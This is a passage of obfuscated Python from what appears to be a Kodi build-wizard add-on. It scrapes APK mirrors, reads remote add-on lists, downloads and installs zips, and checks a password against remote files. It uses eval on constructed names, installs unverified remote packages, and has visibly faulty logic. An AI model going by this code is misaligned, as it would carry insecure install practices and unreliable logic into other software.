	O0OO0O0000O0000O0 =eval ('THIRD%sURL'%OO0OOOO00OO00O0O0 )#line:2029
	OOO0OOOOO00O0OO00 =wiz .workingURL (O0OO0O0000O0000O0 )#line:2030
	if not OOO0OOOOO00O0OO00 ==True :#line:2031
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2032
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2033
	else :#line:2034
		O00OOO00OO0OO000O ,OO0O00O000OOO0O00 =wiz .thirdParty (O0OO0O0000O0000O0 )#line:2035
		addFile ("[B]%s[/B]"%O000O000O0O0OOO00 ,'',themeit =THEME3 )#line:2036
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2037
		if O00OOO00OO0OO000O :#line:2038
			for O000O000O0O0OOO00 ,OO0OO0OO0OOO0OOOO ,O0OO0O0000O0000O0 ,O00O00O00O000OO0O ,OOOO0O000000OOOOO ,OOO0OOOO0OOOO0O00 ,OO00OOO000O000000 ,OOOO0O00O0OOO0OOO in OO0O00O000OOO0O00 :#line:2039
				if not SHOWADULT =='true'and OO00OOO000O000000 .lower ()=='yes':continue #line:2040
				addFile ("[%s] %s v%s"%(O00O00O00O000OO0O ,O000O000O0O0OOO00 ,OO0OO0OO0OOO0OOOO ),'installthird',O000O000O0O0OOO00 ,O0OO0O0000O0000O0 ,icon =OOOO0O000000OOOOO ,fanart =OOO0OOOO0OOOO0O00 ,description =OOOO0O00O0OOO0OOO ,themeit =THEME2 )#line:2041
		else :#line:2042
			for O000O000O0O0OOO00 ,O0OO0O0000O0000O0 ,OOOO0O000000OOOOO ,OOO0OOOO0OOOO0O00 ,OOOO0O00O0OOO0OOO in OO0O00O000OOO0O00 :#line:2043
				addFile (O000O000O0O0OOO00 ,'installthird',O000O000O0O0OOO00 ,O0OO0O0000O0000O0 ,icon =OOOO0O000000OOOOO ,fanart =OOO0OOOO0OOOO0O00 ,description =OOOO0O00O0OOO0OOO ,themeit =THEME2 )#line:2044
def editThirdParty (O0000O0OO0O0000O0 ):#line:2046
	O000OOOO0OO0OOO0O =eval ('THIRD%sNAME'%O0000O0OO0O0000O0 )#line:2047
	OOOOOOO00000OO0O0 =eval ('THIRD%sURL'%O0000O0OO0O0000O0 )#line:2048
	O0O0OOOOO00OO0O00 =wiz .getKeyboard (O000OOOO0OO0OOO0O ,'Enter the Name of the Wizard')#line:2049
	O00OO0000O0OO0O00 =wiz .getKeyboard (OOOOOOO00000OO0O0 ,'Enter the URL of the Wizard Text')#line:2050
	wiz .setS ('wizard%sname'%O0000O0OO0O0000O0 ,O0O0OOOOO00OO0O00 )#line:2052
	wiz .setS ('wizard%surl'%O0000O0OO0O0000O0 ,O00OO0000O0OO0O00 )#line:2053
def apkScraper (name =""):#line:2055
	if name =='kodi':#line:2056
		O000O0OOOO00OOOO0 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2057
		O0OO0O0O00OOO000O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2058
		O0OO0000000OO0O0O =wiz .openURL (O000O0OOOO00OOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2059
		OOOO0O0000OOOO000 =wiz .openURL (O0OO0O0O00OOO000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2060
		O0OOOO0O00OO000O0 =0 #line:2061
		OO0OO0OOO0OO00O0O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0OO0000000OO0O0O )#line:2062
		O0O00OOOO0O0O0OOO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOOO0O0000OOOO000 )#line:2063
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2065
		O000O000O0OO0OO0O =False #line:2066
		for OO0OOOO0O0000OO00 ,name ,OO0OO000O00OOOOO0 ,OOO00OOO0OO00000O in OO0OO0OOO0OO00O0O :#line:2067
			if OO0OOOO0O0000OO00 in ['../','old/']:continue #line:2068
			if not OO0OOOO0O0000OO00 .endswith ('.apk'):continue #line:2069
			if not OO0OOOO0O0000OO00 .find ('_')==-1 and O000O000O0OO0OO0O ==True :continue #line:2070
			try :#line:2071
				OOOO00OO0OOOO0O0O =name .split ('-')#line:2072
				if not OO0OOOO0O0000OO00 .find ('_')==-1 :#line:2073
					O000O000O0OO0OO0O =True #line:2074
					OOOO00O00OOO000OO ,O00OOO000OO000000 =OOOO00OO0OOOO0O0O [2 ].split ('_')#line:2075
				else :#line:2076
					OOOO00O00OOO000OO =OOOO00OO0OOOO0O0O [2 ]#line:2077
					O00OOO000OO000000 =''#line:2078
				O0O0OOO00O00O00O0 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO00OO0OOOO0O0O [0 ].title (),OOOO00OO0OOOO0O0O [1 ],O00OOO000OO000000 .upper (),OOOO00O00OOO000OO ,COLOR2 ,OO0OO000O00OOOOO0 .replace (' ',''),COLOR1 ,OOO00OOO0OO00000O )#line:2079
				OOO0O000O0OOO0O0O =urljoin (O000O0OOOO00OOOO0 ,OO0OOOO0O0000OO00 )#line:2080
				addFile (O0O0OOO00O00O00O0 ,'apkinstall',"%s v%s%s %s"%(OOOO00OO0OOOO0O0O [0 ].title (),OOOO00OO0OOOO0O0O [1 ],O00OOO000OO000000 .upper (),OOOO00O00OOO000OO ),OOO0O000O0OOO0O0O )#line:2081
				O0OOOO0O00OO000O0 +=1 #line:2082
			except :#line:2083
				wiz .log ("Error on: %s"%name )#line:2084
		for OO0OOOO0O0000OO00 ,name ,OO0OO000O00OOOOO0 ,OOO00OOO0OO00000O in O0O00OOOO0O0O0OOO :#line:2086
			if OO0OOOO0O0000OO00 in ['../','old/']:continue #line:2087
			if not OO0OOOO0O0000OO00 .endswith ('.apk'):continue #line:2088
			if not OO0OOOO0O0000OO00 .find ('_')==-1 :continue #line:2089
			try :#line:2090
				OOOO00OO0OOOO0O0O =name .split ('-')#line:2091
				O0O0OOO00O00O00O0 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO00OO0OOOO0O0O [0 ].title (),OOOO00OO0OOOO0O0O [1 ],OOOO00OO0OOOO0O0O [2 ],COLOR2 ,OO0OO000O00OOOOO0 .replace (' ',''),COLOR1 ,OOO00OOO0OO00000O )#line:2092
				OOO0O000O0OOO0O0O =urljoin (O0OO0O0O00OOO000O ,OO0OOOO0O0000OO00 )#line:2093
				addFile (O0O0OOO00O00O00O0 ,'apkinstall',"%s v%s %s"%(OOOO00OO0OOOO0O0O [0 ].title (),OOOO00OO0OOOO0O0O [1 ],OOOO00OO0OOOO0O0O [2 ]),OOO0O000O0OOO0O0O )#line:2094
				O0OOOO0O00OO000O0 +=1 #line:2095
			except :#line:2096
				wiz .log ("Error on: %s"%name )#line:2097
		if O0OOOO0O00OO000O0 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2098
	elif name =='spmc':#line:2099
		O0OO0O0OOO000O000 ='https://github.com/koying/SPMC/releases'#line:2100
		O0OO0000000OO0O0O =wiz .openURL (O0OO0O0OOO000O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2101
		O0OOOO0O00OO000O0 =0 #line:2102
		OO0OO0OOO0OO00O0O =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O0OO0000000OO0O0O )#line:2103
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2105
		for name ,O0O00OO0O0O0O000O in OO0OO0OOO0OO00O0O :#line:2107
			O000O0OOO00O0000O =''#line:2108
			O0O00OOOO0O0O0OOO =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O0O00OO0O0O0O000O )#line:2109
			for OO0O0OO0OOO00OOO0 ,O00O00OOO0O000O0O ,O0OO0OO0OOOOOOO0O in O0O00OOOO0O0O0OOO :#line:2110
				if O0OO0OO0OOOOOOO0O .find ('armeabi')==-1 :continue #line:2111
				if O0OO0OO0OOOOOOO0O .find ('launcher')>-1 :continue #line:2112
				O000O0OOO00O0000O =urljoin ('https://github.com',OO0O0OO0OOO00OOO0 )#line:2113
				break #line:2114
		if O0OOOO0O00OO000O0 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2116
def apkMenu (url =None ):#line:2118
	if url ==None :#line:2119
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2122
	if not APKFILE =='http://':#line:2123
		if url ==None :#line:2124
			OO0O000OO000OO0OO =wiz .workingURL (APKFILE )#line:2125
			O0000OO0O0O0OOOO0 =uservar .APKFILE #line:2126
		else :#line:2127
			OO0O000OO000OO0OO =wiz .workingURL (url )#line:2128
			O0000OO0O0O0OOOO0 =url #line:2129
		if OO0O000OO000OO0OO ==True :#line:2130
			O0O0OO000OO00OO0O =wiz .openURL (O0000OO0O0O0OOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2131
			OO000000OOOOO0000 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O0OO000OO00OO0O )#line:2132
			if len (OO000000OOOOO0000 )>0 :#line:2133
				OOO0000O0OOOO00O0 =0 #line:2134
				for O0O0000OOOOOO00OO ,O0OO000OOO00O0000 ,url ,OO000OO00OO0OO00O ,O00O0O0O000O0OOOO ,OO0OOOO0O0OOOO000 ,O0OO0O00O0OO0OO0O in OO000000OOOOO0000 :#line:2135
					if not SHOWADULT =='true'and OO0OOOO0O0OOOO000 .lower ()=='yes':continue #line:2136
					if O0OO000OOO00O0000 .lower ()=='yes':#line:2137
						OOO0000O0OOOO00O0 +=1 #line:2138
						addDir ("[B]%s[/B]"%O0O0000OOOOOO00OO ,'apk',url ,description =O0OO0O00O0OO0OO0O ,icon =OO000OO00OO0OO00O ,fanart =O00O0O0O000O0OOOO ,themeit =THEME3 )#line:2139
					else :#line:2140
						OOO0000O0OOOO00O0 +=1 #line:2141
						addFile (O0O0000OOOOOO00OO ,'apkinstall',O0O0000OOOOOO00OO ,url ,description =O0OO0O00O0OO0OO0O ,icon =OO000OO00OO0OO00O ,fanart =O00O0O0O000O0OOOO ,themeit =THEME2 )#line:2142
					if OOO0000O0OOOO00O0 <1 :#line:2143
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2144
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2145
		else :#line:2146
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2147
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2148
			addFile ('%s'%OO0O000OO000OO0OO ,'',themeit =THEME3 )#line:2149
		return #line:2150
	else :wiz .log ("[APK Menu] No APK list added.")#line:2151
	setView ('files','viewType')#line:2152
def addonMenu (url =None ):#line:2154
	if not ADDONFILE =='http://':#line:2155
		if url ==None :#line:2156
			O0O0O000O000O000O =wiz .workingURL (ADDONFILE )#line:2157
			OOOO0O0000O0OO000 =uservar .ADDONFILE #line:2158
		else :#line:2159
			O0O0O000O000O000O =wiz .workingURL (url )#line:2160
			OOOO0O0000O0OO000 =url #line:2161
		if O0O0O000O000O000O ==True :#line:2162
			O0OOOO0O0OOO0OO00 =wiz .openURL (OOOO0O0000O0OO000 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2163
			O00O0O000O0O00000 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OOOO0O0OOO0OO00 )#line:2164
			if len (O00O0O000O0O00000 )>0 :#line:2165
				O000O000000O0OOO0 =0 #line:2166
				for O00OOOO000O00OOOO ,OO00O00OOO0000OOO ,url ,O0O0OOO00OO0OOOO0 ,OO0O000O0000O0O00 ,OOOOO00OO00000OOO ,O0000OO00OOOOO0OO ,O0000O0OO0000O000 ,OO000OOO0O00OO0OO ,OO0OO0OO0OO0OO0OO in O00O0O000O0O00000 :#line:2167
					if OO00O00OOO0000OOO .lower ()=='section':#line:2168
						O000O000000O0OOO0 +=1 #line:2169
						addDir ("[B]%s[/B]"%O00OOOO000O00OOOO ,'addons',url ,description =OO0OO0OO0OO0OO0OO ,icon =O0000OO00OOOOO0OO ,fanart =O0000O0OO0000O000 ,themeit =THEME3 )#line:2170
					else :#line:2171
						if not SHOWADULT =='true'and OO000OOO0O00OO0OO .lower ()=='yes':continue #line:2172
						try :#line:2173
							O0OOOO0O0O00000O0 =xbmcaddon .Addon (id =OO00O00OOO0000OOO ).getAddonInfo ('path')#line:2174
							if os .path .exists (O0OOOO0O0O00000O0 ):#line:2175
								O00OOOO000O00OOOO ="[COLOR green][Installed][/COLOR] %s"%O00OOOO000O00OOOO #line:2176
						except :#line:2177
							pass #line:2178
						O000O000000O0OOO0 +=1 #line:2179
						addFile (O00OOOO000O00OOOO ,'addoninstall',OO00O00OOO0000OOO ,OOOO0O0000O0OO000 ,description =OO0OO0OO0OO0OO0OO ,icon =O0000OO00OOOOO0OO ,fanart =O0000O0OO0000O000 ,themeit =THEME2 )#line:2180
					if O000O000000O0OOO0 <1 :#line:2181
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2182
			else :#line:2183
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2184
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2185
		else :#line:2186
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2187
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2188
			addFile ('%s'%O0O0O000O000O000O ,'',themeit =THEME3 )#line:2189
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2190
	setView ('files','viewType')#line:2191
def addonInstaller (OOOO0000O00OOOO00 ,OOO0OOOO00O0OOOO0 ):#line:2193
	if not ADDONFILE =='http://':#line:2194
		O00000OO0O00O00O0 =wiz .workingURL (OOO0OOOO00O0OOOO0 )#line:2195
		if O00000OO0O00O00O0 ==True :#line:2196
			O00O00000000O00OO =wiz .openURL (OOO0OOOO00O0OOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2197
			OOO0000O00000O00O =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOOO0000O00OOOO00 ).findall (O00O00000000O00OO )#line:2198
			if len (OOO0000O00000O00O )>0 :#line:2199
				for OOOO0O0OOO00OOOOO ,OOO0OOOO00O0OOOO0 ,OOO00OO0OO0000O0O ,O0O0O0OO000O00OO0 ,OO0O0O0OO0OOO00O0 ,OO00O000OO0OOOO00 ,O00OOOOO0OO00OOO0 ,O00O0OOOO00OO00O0 ,OO0OOO0OOOOOOO0O0 in OOO0000O00000O00O :#line:2200
					if os .path .exists (os .path .join (ADDONS ,OOOO0000O00OOOO00 )):#line:2201
						O000O0OOO0O00O00O =['Launch Addon','Remove Addon']#line:2202
						O0OOOO00OOOOOOOOO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O000O0OOO0O00O00O )#line:2203
						if O0OOOO00OOOOOOOOO ==0 :#line:2204
							wiz .ebi ('RunAddon(%s)'%OOOO0000O00OOOO00 )#line:2205
							xbmc .sleep (1000 )#line:2206
							return True #line:2207
						elif O0OOOO00OOOOOOOOO ==1 :#line:2208
							wiz .cleanHouse (os .path .join (ADDONS ,OOOO0000O00OOOO00 ))#line:2209
							try :wiz .removeFolder (os .path .join (ADDONS ,OOOO0000O00OOOO00 ))#line:2210
							except :pass #line:2211
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOO0000O00OOOO00 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2212
								removeAddonData (OOOO0000O00OOOO00 )#line:2213
							wiz .refresh ()#line:2214
							return True #line:2215
						else :#line:2216
							return False #line:2217
					O00000O0O000OOO0O =os .path .join (ADDONS ,OOO00OO0OO0000O0O )#line:2218
					if not OOO00OO0OO0000O0O .lower ()=='none'and not os .path .exists (O00000O0O000OOO0O ):#line:2219
						wiz .log ("Repository not installed, installing it")#line:2220
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OOOO0000O00OOOO00 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOO00OO0OO0000O0O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2221
							OO000OOO0O00OOO0O =wiz .parseDOM (wiz .openURL (O0O0O0OO000O00OO0 ),'addon',ret ='version',attrs ={'id':OOO00OO0OO0000O0O })#line:2222
							if len (OO000OOO0O00OOO0O )>0 :#line:2223
								O000O0O0OOO0O0OO0 ='%s%s-%s.zip'%(OO0O0O0OO0OOO00O0 ,OOO00OO0OO0000O0O ,OO000OOO0O00OOO0O [0 ])#line:2224
								wiz .log (O000O0O0OOO0O0OO0 )#line:2225
								if KODIV >=17 :wiz .addonDatabase (OOO00OO0OO0000O0O ,1 )#line:2226
								installAddon (OOO00OO0OO0000O0O ,O000O0O0OOO0O0OO0 )#line:2227
								wiz .ebi ('UpdateAddonRepos()')#line:2228
								wiz .log ("Installing Addon from Kodi")#line:2230
								OOO0OO00OOO0OO00O =installFromKodi (OOOO0000O00OOOO00 )#line:2231
								wiz .log ("Install from Kodi: %s"%OOO0OO00OOO0OO00O )#line:2232
								if OOO0OO00OOO0OO00O :#line:2233
									wiz .refresh ()#line:2234
									return True #line:2235
							else :#line:2236
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OOO00OO0OO0000O0O )#line:2237
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OOOO0000O00OOOO00 ,OOO00OO0OO0000O0O ))#line:2238
					elif OOO00OO0OO0000O0O .lower ()=='none':#line:2239
						wiz .log ("No repository, installing addon")#line:2240
						O0O00O00OO0000OOO =OOOO0000O00OOOO00 #line:2241
						OO0OO000O000OO000 =OOO0OOOO00O0OOOO0 #line:2242
						installAddon (OOOO0000O00OOOO00 ,OOO0OOOO00O0OOOO0 )#line:2243
						wiz .refresh ()#line:2244
						return True #line:2245
					else :#line:2246
						wiz .log ("Repository installed, installing addon")#line:2247
						OOO0OO00OOO0OO00O =installFromKodi (OOOO0000O00OOOO00 ,False )#line:2248
						if OOO0OO00OOO0OO00O :#line:2249
							wiz .refresh ()#line:2250
							return True #line:2251
					if os .path .exists (os .path .join (ADDONS ,OOOO0000O00OOOO00 )):return True #line:2252
					O0OO0OO0O0O00OO0O =wiz .parseDOM (wiz .openURL (O0O0O0OO000O00OO0 ),'addon',ret ='version',attrs ={'id':OOOO0000O00OOOO00 })#line:2253
					if len (O0OO0OO0O0O00OO0O )>0 :#line:2254
						OOO0OOOO00O0OOOO0 ="%s%s-%s.zip"%(OOO0OOOO00O0OOOO0 ,OOOO0000O00OOOO00 ,O0OO0OO0O0O00OO0O [0 ])#line:2255
						wiz .log (str (OOO0OOOO00O0OOOO0 ))#line:2256
						if KODIV >=17 :wiz .addonDatabase (OOOO0000O00OOOO00 ,1 )#line:2257
						installAddon (OOOO0000O00OOOO00 ,OOO0OOOO00O0OOOO0 )#line:2258
						wiz .refresh ()#line:2259
					else :#line:2260
						wiz .log ("no match");return False #line:2261
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2262
		else :wiz .log ("[Addon Installer] Text File: %s"%O00000OO0O00O00O0 )#line:2263
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2264
def installFromKodi (OOO0O0OO00O0OO0O0 ,over =True ):#line:2266
	if over ==True :#line:2267
		xbmc .sleep (2000 )#line:2268
	wiz .ebi ('RunPlugin(plugin://%s)'%OOO0O0OO00O0OO0O0 )#line:2270
	if not wiz .whileWindow ('yesnodialog'):#line:2271
		return False #line:2272
	xbmc .sleep (1000 )#line:2273
	if wiz .whileWindow ('okdialog'):#line:2274
		return False #line:2275
	wiz .whileWindow ('progressdialog')#line:2276
	if os .path .exists (os .path .join (ADDONS ,OOO0O0OO00O0OO0O0 )):return True #line:2277
	else :return False #line:2278
def installAddon (OOOOO0O0OO00000O0 ,OOOOOOO0O000O0000 ):#line:2280
	if not wiz .workingURL (OOOOOOO0O000O0000 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OOOOO0O0OO00000O0 ,COLOR2 ));return #line:2281
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2282
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOO0O0OO00000O0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2283
	OO00O0O0OOOOO0000 =OOOOOOO0O000O0000 .split ('/')#line:2284
	O00000O0OOO00O0O0 =os .path .join (PACKAGES ,OO00O0O0OOOOO0000 [-1 ])#line:2285
	try :os .remove (O00000O0OOO00O0O0 )#line:2286
	except :pass #line:2287
	downloader .download (OOOOOOO0O000O0000 ,O00000O0OOO00O0O0 ,DP )#line:2288
	OOO0000OO0O0O00OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOO0O0OO00000O0 )#line:2289
	DP .update (0 ,OOO0000OO0O0O00OO ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2290
	O00O00000O00OOO00 ,O0OOOO0O00O00OO0O ,O0O0O00OO0O00OO00 =extract .all (O00000O0OOO00O0O0 ,ADDONS ,DP ,title =OOO0000OO0O0O00OO )#line:2291
	DP .update (0 ,OOO0000OO0O0O00OO ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2292
	installed (OOOOO0O0OO00000O0 )#line:2293
	installDep (OOOOO0O0OO00000O0 ,DP )#line:2294
	DP .close ()#line:2295
	wiz .ebi ('UpdateAddonRepos()')#line:2296
	wiz .ebi ('UpdateLocalAddons()')#line:2297
	wiz .refresh ()#line:2298
def installDep (O0OOO000O0OO0OOO0 ,DP =None ):#line:2300
	OO0OO0OOOOO000OO0 =os .path .join (ADDONS ,O0OOO000O0OO0OOO0 ,'addon.xml')#line:2301
	if os .path .exists (OO0OO0OOOOO000OO0 ):#line:2302
		OOO00000O0O0OOO0O =open (OO0OO0OOOOO000OO0 ,mode ='r');O00O0OOO00O00000O =OOO00000O0O0OOO0O .read ();OOO00000O0O0OOO0O .close ();#line:2303
		O0OO0OO0OOOO00000 =wiz .parseDOM (O00O0OOO00O00000O ,'import',ret ='addon')#line:2304
		for OOO0OOO00OOO00000 in O0OO0OO0OOOO00000 :#line:2305
			if not 'xbmc.python'in OOO0OOO00OOO00000 :#line:2306
				if not DP ==None :#line:2307
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0OOO00OOO00000 ))#line:2308
				wiz .createTemp (OOO0OOO00OOO00000 )#line:2309
def installed (O0O00O0OOOOOOOOO0 ):#line:2336
	OO00O0O000OO00OO0 =os .path .join (ADDONS ,O0O00O0OOOOOOOOO0 ,'addon.xml')#line:2337
	if os .path .exists (OO00O0O000OO00OO0 ):#line:2338
		try :#line:2339
			O0OOO0O000OOO0OOO =open (OO00O0O000OO00OO0 ,mode ='r');OO0OO0O0O00O0OO00 =O0OOO0O000OOO0OOO .read ();O0OOO0O000OOO0OOO .close ()#line:2340
			OO0O0OOOO0000OOOO =wiz .parseDOM (OO0OO0O0O00O0OO00 ,'addon',ret ='name',attrs ={'id':O0O00O0OOOOOOOOO0 })#line:2341
			O0000OO0OO0OOO000 =os .path .join (ADDONS ,O0O00O0OOOOOOOOO0 ,'icon.png')#line:2342
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O0OOOO0000OOOO [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O0000OO0OO0OOO000 )#line:2343
		except :pass #line:2344
def youtubeMenu (url =None ):#line:2346
	if not YOUTUBEFILE =='http://':#line:2347
		if url ==None :#line:2348
			OO00OOO0000OOOO0O =wiz .workingURL (YOUTUBEFILE )#line:2349
			O0O000O0OO00000OO =uservar .YOUTUBEFILE #line:2350
		else :#line:2351
			OO00OOO0000OOOO0O =wiz .workingURL (url )#line:2352
			O0O000O0OO00000OO =url #line:2353
		if OO00OOO0000OOOO0O ==True :#line:2354
			O0O0O0OO0OO00OO0O =wiz .openURL (O0O000O0OO00000OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2355
			O0OO00O0O0O0OO000 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0O0OO0OO00OO0O )#line:2356
			if len (O0OO00O0O0O0OO000 )>0 :#line:2357
				for O0O0OO00OOO0OO000 ,O00OO00O0000OOO0O ,url ,O0OO000000O0O0OO0 ,OOO000O00OOOO00OO ,O0O00OO00000O00O0 in O0OO00O0O0O0OO000 :#line:2358
					if O00OO00O0000OOO0O .lower ()=="yes":#line:2359
						addDir ("[B]%s[/B]"%O0O0OO00OOO0OO000 ,'youtube',url ,description =O0O00OO00000O00O0 ,icon =O0OO000000O0O0OO0 ,fanart =OOO000O00OOOO00OO ,themeit =THEME3 )#line:2360
					else :#line:2361
						addFile (O0O0OO00OOO0OO000 ,'viewVideo',url =url ,description =O0O00OO00000O00O0 ,icon =O0OO000000O0O0OO0 ,fanart =OOO000O00OOOO00OO ,themeit =THEME2 )#line:2362
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2363
		else :#line:2364
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2365
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2366
			addFile ('%s'%OO00OOO0000OOOO0O ,'',themeit =THEME3 )#line:2367
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2368
	setView ('files','viewType')#line:2369
def STARTP ():#line:2370
	OO0O0OOOOOOOO00O0 =(ADDON .getSetting ("pass"))#line:2371
	if BUILDNAME =="":#line:2372
	 if not NOTIFY =='true':#line:2373
          O0OO00OOOOO00OO00 =wiz .workingURL (NOTIFICATION )#line:2374
	 if not NOTIFY2 =='true':#line:2375
          O0OO00OOOOO00OO00 =wiz .workingURL (NOTIFICATION2 )#line:2376
	 if not NOTIFY3 =='true':#line:2377
          O0OO00OOOOO00OO00 =wiz .workingURL (NOTIFICATION3 )#line:2378
	OOO0O0OO00000OO0O =OO0O0OOOOOOOO00O0 #line:2379
	O0OO00OOOOO00OO00 =urllib2 .Request (SPEED )#line:2380
	OO0OO0O000O00O0O0 =urllib2 .urlopen (O0OO00OOOOO00OO00 )#line:2381
	O00O000O00000O000 =OO0OO0O000O00O0O0 .read ()#line:2382
	if OO0O0OOOOOOOO00O0 ==OOO0O0OO00000OO0O :#line:2383
				O0OO00OOOOO00OO00 =list #line:2384
				if OOO0O0OO00000OO0O !=O00O000O00000O000 :#line:2385
					OOO00O0O000OOO0O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2386
					if OOO00O0O000OOO0O0 :#line:2388
						ADDON .openSettings ()#line:2390
						STARTP ()#line:2391
						sys .exit ()#line:2392
					else :#line:2393
						sys .exit ()#line:2394
	return 'ok'#line:2398
def STARTP2 ():#line:2399
	OO0O0OO00OOO0O000 =(ADDON .getSetting ("user"))#line:2400
	O0OO000OO0OO00000 =(UNAME )#line:2402
	OOO000OO000OOO0O0 =urllib2 .urlopen (O0OO000OO0OO00000 )#line:2403
	OOOO0OOO0OO00OOO0 =OOO000OO000OOO0O0 .readlines ()#line:2404
	OO0OOOO00O0O00O00 =0 #line:2405
	for OOO0OOO000O0O0O00 in OOOO0OOO0OO00OOO0 :#line:2408
		if OOO0OOO000O0O0O00 .split (' ==')[0 ]==OO0O0OO00OOO0O000 or OOO0OOO000O0O0O00 .split ()[0 ]==OO0O0OO00OOO0O000 :#line:2409
			OO0OOOO00O0O00O00 =1 #line:2410
			break #line:2411
	if OO0OOOO00O0O00O00 ==0 :#line:2412
